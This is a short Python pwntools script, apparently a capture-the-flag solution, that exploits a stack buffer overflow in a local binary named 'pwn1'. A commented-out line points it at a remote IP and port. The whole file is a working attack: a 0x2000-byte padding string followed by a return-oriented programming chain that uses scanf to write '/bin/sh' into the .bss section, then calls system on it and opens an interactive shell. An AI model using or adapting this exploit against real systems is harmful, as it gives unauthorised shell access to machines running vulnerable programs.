from pwn import *
context(arch="amd64",os="linux",log_level="debug")
context.terminal = ['tmux','splitw','-h']
p=process("./pwn1")
elf = ELF("./pwn1")
#p=remote("152.1xx.xx.97",20001)
#gdb.attach(p)

main_addr= elf.symbols["main"]
system_addr=elf.plt["system"]
scanf_addr = elf.plt["__isoc99_scanf"]
s_addr = elf.search("%s").next()
rdi_addr = 0x00000000004007e3
rsi_addr = 0x00000000004007e1
print(hex(s_addr),hex(system_addr))
bss = 0x601040

p.recvuntil("\n")
payload ="A"*0x2000+p64(0xdeadbeef)+p64(rdi_addr)+p64(s_addr)+p64(rsi_addr)+p64(bss)+p64(0)+p64(scanf_addr)+p64(rdi_addr)+p64(bss)+p64(rsi_addr)+p64(0)+p64(0)+p64(system_addr)
p.sendline(payload)
p.sendline("/bin/sh\x00")
p.interactive()
